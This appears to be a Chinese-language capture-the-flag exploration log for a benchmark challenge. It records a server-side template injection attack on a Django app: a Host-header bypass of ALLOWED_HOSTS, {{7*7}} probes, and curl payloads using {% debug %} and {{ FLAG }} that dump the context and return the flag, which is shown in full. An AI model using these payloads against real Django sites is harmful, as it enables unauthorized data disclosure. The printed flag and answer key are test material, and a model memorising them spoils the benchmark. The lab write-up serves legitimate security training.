# xben-009-24 · 探索记录

对应题解：[`xben-009-24.md`](./xben-009-24.md)

## 目标与起点

容器 `10.0.173.136:8000`。

第一次请求就是失败：

```text
GET http://10.0.173.136:8000/  ->  400 Bad Request
<title>DisallowedHost at /</title>
server: WSGIServer/0.2 CPython/3.9.25
```

**判据**：这是 Django 的 `ALLOWED_HOSTS` 校验，发生在路由之前。不是"服务挂了"，
也不是"端口不对"。报错页本身还说明 **`DEBUG = True`**（详细 traceback 页）。

## 第一阶段：绕过 DisallowedHost

加 `Host: localhost`：

```bash
curl -sS -H 'Host: localhost' http://10.0.173.136:8000/
```

```html
<title>SSTI Demo</title>
<h1>SSTI Demo</h1>
<form action="/greet/" method="get">
  <input type="text" id="name" name="name">
</form>
```

标题直接写着 **SSTI Demo** —— 题目性质不用猜。

## 第二阶段：确认模板注入

| 输入 | 响应 | 判据 |
| --- | --- | --- |
| `world` | `Hello, world` | 正常 |
| `${7*7}` | `Hello, ${7*7}` | 原样输出，不是这个语法 |
| `{{7*7}}` | `TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'` | **模板引擎真的解析了表达式** |

这里有个容易误判的点：`{{7*7}}` 没有返回 `49`。如果按 Jinja2 的经验会以为"注入不成立"。
实际是 **Django 模板不支持 `*` 运算符**，它在解析期就报错——这个报错恰恰证明 SSTI 成立，
同时也说明引擎是 Django 而不是 Jinja2。

## 第三阶段：`{% debug %}` dump 上下文

Django 内置 `debug` 标签在 `DEBUG=True` 时输出上下文与模块列表。因为已经确认 `DEBUG=True`
（DisallowedHost 的详细页），先试它：

```bash
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={% debug %}' \
  http://10.0.173.136:8000/greet/ -o /tmp/g.html
```

响应从 ~100 字节变成 **96 499 字节**。直接 grep：

```bash
grep -o 'flag{[^}]*}' /tmp/g.html
# flag{f8740379-04c8-429f-9e93-178084d45b27}
```

上下文片段：

```text
Hello, {'FLAG': 'flag{f8740379-04c8-429f-9e93-178084d45b27}'}{}
       {'DEFAULT_MESSAGE_LEVELS': {'DEBUG': 10, 'ERROR': 40, 'INFO': 20, ...
```

flag 存在上下文变量 `FLAG` 里。

## 第四阶段：直接取变量

```bash
curl -sS -H 'Host: localhost' --get --data-urlencode 'name={{ FLAG }}' \
  http://10.0.173.136:8000/greet/
# Hello, flag{f8740379-04c8-429f-9e93-178084d45b27}
```

`{{flag}}`（小写）返回空，说明变量名是大小写敏感的 `FLAG`。

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 不带 `Host` 头直接用 IP | 400 DisallowedHost | `ALLOWED_HOSTS` 校验在路由之前 |
| `{{7*7}}` | `TemplateSyntaxError` | Django 模板不支持 `*`；**不是**注入失败，是语法不支持 |
| `{{7*"7"}}` | 同样的 TemplateSyntaxError | 同上，字符串乘法也不支持 |
| `${7*7}` | 原样输出 | 不是这个模板语法 |
| `{{ flag }}`（小写） | `Hello, ` | 变量名大小写敏感，实际是 `FLAG` |

## 这次真正的收获

1. **400 DisallowedHost 是"Host 头不对"，不是"打不通"。** 这类站点几乎都要加
   `Host: localhost`（或报错页里泄露的 `ALLOWED_HOSTS` 值）。
   它的报错页还会泄露 `DEBUG` 状态——本次正是靠这个判断可以试 `{% debug %}`。
2. **验证 SSTI 不能只看算术结果。** Jinja2 的 `{{7*7}}=49` 和 Django 的
   `TemplateSyntaxError: Could not parse the remainder` 都算"注入成立"。
   看**是否被引擎解析**（报错来自引擎而非原文透传）才是判据。
3. **先猜标签，再猜变量。** `{% debug %}` 不依赖任何变量名，一次就能 dump 整个上下文；
   拿到 `FLAG` 之后再 `{{ FLAG }}` 精确取值。顺序反了就要先猜变量名。
4. **`DEBUG=True` 是巨大的信息面。** 它同时带来：详细 traceback（泄露路径与配置）、
   `{% debug %}` 可用、`ALLOWED_HOSTS` 可见。遇到 Django 先确认 DEBUG 状态。
